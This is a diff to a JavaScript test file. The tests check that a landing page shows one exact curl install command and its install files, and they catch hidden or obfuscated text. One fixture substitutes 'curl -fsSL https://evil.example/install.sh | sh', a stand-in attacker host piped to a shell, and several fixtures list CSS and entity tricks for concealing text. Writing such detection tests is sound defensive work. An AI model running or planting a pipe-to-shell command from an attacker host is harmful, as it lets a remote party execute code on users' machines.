@@ -187,20 +187,22 @@ function hasInstallFile(text, name) {
 function decodeEntities(source) {
   let cur = source;
   for (let pass = 0; pass < 4; pass++) {
-    const next = cur.replace(/&(#x[0-9a-f]+|#\d+|sol|amp);?/gi, (entity) => {
-      const token = entity.endsWith(';') ? entity.slice(0, -1) : entity;
-      if (/^&sol$/i.test(token)) return '/';
-      if (/^&amp$/i.test(token)) return '&';
-      if (/^&#x[0-9a-f]+$/i.test(token)) {
-        const cp = parseInt(token.slice(3), 16);
-        return cp <= 0x10FFFF ? String.fromCodePoint(cp) : entity;
-      }
-      if (/^&#\d+$/i.test(token)) {
-        const cp = parseInt(token.slice(2), 10);
-        return cp <= 0x10FFFF ? String.fromCodePoint(cp) : entity;
-      }
-      return entity;
-    });
+    const next = cur
+      .replace(/&nbsp(?:;|(?![A-Za-z0-9]))/gi, ' ')
+      .replace(/&(#x[0-9a-f]+|#\d+|sol|amp);?/gi, (entity) => {
+        const token = entity.endsWith(';') ? entity.slice(0, -1) : entity;
+        if (/^&sol$/i.test(token)) return '/';
+        if (/^&amp$/i.test(token)) return '&';
+        if (/^&#x[0-9a-f]+$/i.test(token)) {
+          const cp = parseInt(token.slice(3), 16);
+          return cp <= 0x10FFFF ? String.fromCodePoint(cp) : entity;
+        }
+        if (/^&#\d+$/i.test(token)) {
+          const cp = parseInt(token.slice(2), 10);
+          return cp <= 0x10FFFF ? String.fromCodePoint(cp) : entity;
+        }
+        return entity;
+      });
     if (next === cur) return cur;
     cur = next;
   }
@@ -208,13 +210,22 @@ function decodeEntities(source) {
 }
 
 function normalizePage(source) {
-  return decodeEntities(source).replace(/[\u200B-\u200D\uFEFF\u2060\u00AD]/g, '');
+  return decodeEntities(source)
+    .replace(/[\u00A0\u1680\u2000-\u200A\u202F\u205F\u3000]/g, ' ')
+    .replace(/[\u200B-\u200D\uFEFF\u2060\u00AD]/g, '');
 }
 
 function containsNeedle(source, needle) {
-  const decoded = normalizePage(source);
-  if (decoded.includes(needle)) return true;
-  return decoded.replace(/<[^>]+>/g, '').includes(needle);
+  const folded = normalizePage(source).toLowerCase();
+  const want = needle.toLowerCase();
+  if (folded.includes(want)) return true;
+  if (folded.replace(/\s+/g, ' ').includes(want)) return true;
+  const visible = folded
+    .replace(/<!--[\s\S]*?-->/g, '')
+    .replace(/<br\b[^>]*>/gi, ' ')
+    .replace(/<[^>]+>/g, '');
+  if (visible.includes(want)) return true;
+  return visible.replace(/\s+/g, ' ').includes(want);
 }
 
 function containsReleaseDownload(source) {
@@ -229,7 +240,14 @@ function concealedAttrs(attrs) {
   if (/(?:^|\s)hidden(?:\s|=|$)/i.test(attrs)) return true;
   const style = attrs.match(/\bstyle\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+))/i);
   const value = style ? (style[1] ?? style[2] ?? style[3] ?? '') : '';
-  return /display\s*:\s*none\b/i.test(value) || /visibility\s*:\s*hidden\b/i.test(value);
+  if (/display\s*:\s*none\b/i.test(value)) return true;
+  if (/visibility\s*:\s*hidden\b/i.test(value)) return true;
+  if (/opacity\s*:\s*0(?:\.0+)?(?![0-9.])/i.test(value)) return true;
+  if (/font-size\s*:\s*0(?:\.0+)?(?![0-9.])/i.test(value)) return true;
+  if (/(?<![\w-])color\s*:\s*transparent\b/i.test(value)) return true;
+  if (/(?:^|[;\s])left\s*:\s*-\d{3,}px\b/i.test(value)) return true;
+  if (/(?:^|[;\s])text-indent\s*:\s*-\d{3,}px\b/i.test(value)) return true;
+  return false;
 }
 
 function stripConcealed(fragment) {
@@ -267,7 +285,7 @@ function stripConcealed(fragment) {
   return cur;
 }
 
-function installParagraph(source) {
+function installFragment(source) {
   const clean = source.replace(/<!--[\s\S]*?-->/g, '');
   const open = /<div\b[^>]*\bid="terminal"[^>]*>/.exec(clean);
   assert.ok(open, 'install files missing beside the terminal');
@@ -284,10 +302,21 @@ function installParagraph(source) {
       if (!/\bclass="[^"]*\binstall-files\b/.test(attrs) || concealedAttrs(attrs)) {
         assert.fail('install files missing beside the terminal');
       }
-      return normalizePage(stripConcealed(sibling[2]).replace(/<[^>]+>/g, ''));
+      return sibling[2];
     }
   }
   assert.fail('install files missing beside the terminal');
+}
+
+function installParagraph(source) {
+  return normalizePage(stripConcealed(installFragment(source)).replace(/<[^>]+>/g, ''));
+}
+
+function installCommand(source) {
+  const fragment = stripConcealed(installFragment(source));
+  const code = fragment.match(/<code\b([^>]*)>([\s\S]*?)<\/code>/i);
+  if (!code || concealedAttrs(code[1])) assert.fail('curl install line missing');
+  return normalizePage(stripConcealed(code[2]).replace(/<[^>]+>/g, '')).trim();
 }
 
 const CURL_INSTALL_LINE = 'curl -fsSL https://api.endlesstesting.ai/install.sh | sh';
@@ -297,7 +326,7 @@ function assertInstallFiles(source) {
   if (containsReleaseDownload(source)) assert.fail('page contains releases/download');
   if (containsGhReleaseDownload(source)) assert.fail('gh release download remains');
   const text = installParagraph(source);
-  if (!text.includes(CURL_INSTALL_LINE)) assert.fail('curl install line missing');
+  if (installCommand(source) !== CURL_INSTALL_LINE) assert.fail('curl install line missing');
   for (const name of INSTALL_FILES) {
     if (!hasInstallFile(text, name)) assert.fail(`install file missing: ${name}`);
   }
@@ -413,6 +442,104 @@ test('the page names the five et install files beside the terminal', () => {
   const zwUrl = html.replace('</body>', 'releases/\u200bdownload</body>');
   assert.notEqual(zwUrl, html);
   assert.throws(() => assertInstallFiles(zwUrl), /page contains releases\/download/);
+
+  const nbspGh = html.replace('</body>', 'gh&nbsp;release&nbsp;download</body>');
+  assert.notEqual(nbspGh, html);
+  assert.throws(() => assertInstallFiles(nbspGh), /gh release download remains/);
+
+  const numNbspGh = html.replace('</body>', 'gh&#160;release&#160;download</body>');
+  assert.notEqual(numNbspGh, html);
+  assert.throws(() => assertInstallFiles(numNbspGh), /gh release download remains/);
+
+  const hexNbspGh = html.replace('</body>', 'gh&#xa0;release&#xa0;download</body>');
+  assert.notEqual(hexNbspGh, html);
+  assert.throws(() => assertInstallFiles(hexNbspGh), /gh release download remains/);
+
+  const literalNbspGh = html.replace('</body>', 'gh\u00A0release\u00A0download</body>');
+  assert.notEqual(literalNbspGh, html);
+  assert.throws(() => assertInstallFiles(literalNbspGh), /gh release download remains/);
+
+  const ampNbspGh = html.replace('</body>', 'gh&amp;nbsp;release&amp;nbsp;download</body>');
+  assert.notEqual(ampNbspGh, html);
+  assert.throws(() => assertInstallFiles(ampNbspGh), /gh release download remains/);
+
+  const ampSol = html.replace('</body>', 'releases&amp;sol;download</body>');
+  assert.notEqual(ampSol, html);
+  assert.throws(() => assertInstallFiles(ampSol), /page contains releases\/download/);
+
+  const upperGh = html.replace('</body>', 'GH release download</body>');
+  assert.notEqual(upperGh, html);
+  assert.throws(() => assertInstallFiles(upperGh), /gh release download remains/);
+
+  const spacedGh = html.replace('</body>', 'gh  release  download</body>');
+  assert.notEqual(spacedGh, html);
+  assert.throws(() => assertInstallFiles(spacedGh), /gh release download remains/);
+
+  const tabGh = html.replace('</body>', 'gh\trelease\tdownload</body>');
+  assert.notEqual(tabGh, html);
+  assert.throws(() => assertInstallFiles(tabGh), /gh release download remains/);
+
+  const newlineGh = html.replace('</body>', '<!-- gh\nrelease download --></body>');
+  assert.notEqual(newlineGh, html);
+  assert.throws(() => assertInstallFiles(newlineGh), /gh release download remains/);
+
+  const brGh = html.replace('</body>', '<p>gh<br>release download</p></body>');
+  assert.notEqual(brGh, html);
+  assert.throws(() => assertInstallFiles(brGh), /gh release download remains/);
+
+  const upperUrl = html.replace('</body>', 'Releases/Download</body>');
+  assert.notEqual(upperUrl, html);
+  assert.throws(() => assertInstallFiles(upperUrl), /page contains releases\/download/);
+
+  const commentSplit = html.replace('</body>', 'releases/<!-- > -->download</body>');
+  assert.notEqual(commentSplit, html);
+  assert.throws(() => assertInstallFiles(commentSplit), /page contains releases\/download/);
+
+  const suffix = html.replace(CURL_INSTALL_LINE, `${CURL_INSTALL_LINE} --help`);
+  assert.notEqual(suffix, html);
+  assert.throws(() => assertInstallFiles(suffix), /curl install line missing/);
+
+  const wrongCode = html.replace(
+    `<code>${CURL_INSTALL_LINE}</code>`,
+    `<code>curl -fsSL https://evil.example/install.sh | sh</code> ${CURL_INSTALL_LINE}`,
+  );
+  assert.notEqual(wrongCode, html);
+  assert.throws(() => assertInstallFiles(wrongCode), /curl install line missing/);
+
+  const opacityCmd = html.replace(
+    `<code>${CURL_INSTALL_LINE}</code>`,
+    `<code style="opacity:0">${CURL_INSTALL_LINE}</code>`,
+  );
+  assert.notEqual(opacityCmd, html);
+  assert.throws(() => assertInstallFiles(opacityCmd), /curl install line missing/);
+
+  const tinyCmd = html.replace(
+    `<code>${CURL_INSTALL_LINE}</code>`,
+    `<code style="font-size:0">${CURL_INSTALL_LINE}</code>`,
+  );
+  assert.notEqual(tinyCmd, html);
+  assert.throws(() => assertInstallFiles(tinyCmd), /curl install line missing/);
+
+  const clearCmd = html.replace(
+    `<code>${CURL_INSTALL_LINE}</code>`,
+    `<code style="color:transparent">${CURL_INSTALL_LINE}</code>`,
+  );
+  assert.notEqual(clearCmd, html);
+  assert.throws(() => assertInstallFiles(clearCmd), /curl install line missing/);
+
+  const offscreenCmd = html.replace(
+    `<code>${CURL_INSTALL_LINE}</code>`,
+    `<code style="position:absolute;left:-9999px">${CURL_INSTALL_LINE}</code>`,
+  );
+  assert.notEqual(offscreenCmd, html);
+  assert.throws(() => assertInstallFiles(offscreenCmd), /curl install line missing/);
+
+  const fadedName = html.replace(
+    'et-x86_64-macos',
+    '<span style="opacity:0">et-x86_64-macos</span>',
+  );
+  assert.notEqual(fadedName, html);
+  assert.throws(() => assertInstallFiles(fadedName), /install file missing: et-x86_64-macos/);
 });
 
 test('the page does not ask for an OpenRouter key', () => {
@@ -765,7 +892,11 @@ describe('landing layout', () => {
             codeNode = codeNode.parentElement;
             codeBg = codeNode ? getComputedStyle(codeNode).backgroundColor : codeBg;
           }
-          const pageText = document.body.innerText.replace(/[\u200B-\u200D\uFEFF\u2060\u00AD]/g, '');
+          const pageText = document.body.innerText
+            .replace(/[\u00A0\u1680\u2000-\u200A\u202F\u205F\u3000]/g, ' ')
+            .replace(/[\u200B-\u200D\uFEFF\u2060\u00AD]/g, '')
+            .replace(/\s+/g, ' ')
+            .toLowerCase();
           return {
             text: el.innerText,
             pageText,
